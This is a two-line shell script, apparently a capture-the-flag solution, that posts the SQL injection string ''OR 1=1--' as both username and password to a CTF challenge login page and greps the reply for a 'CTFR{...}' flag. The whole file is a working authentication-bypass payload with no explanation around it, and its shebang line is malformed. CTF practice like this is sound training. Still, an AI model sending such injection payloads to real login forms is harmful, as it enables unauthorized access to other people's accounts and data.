#/bin/bash

curl -s -X POST -d "username='OR 1=1--'&password='OR 1=1--'" https://web.ctf.rasyidmf.com/chal36/ | grep -oE CTFR{.*}
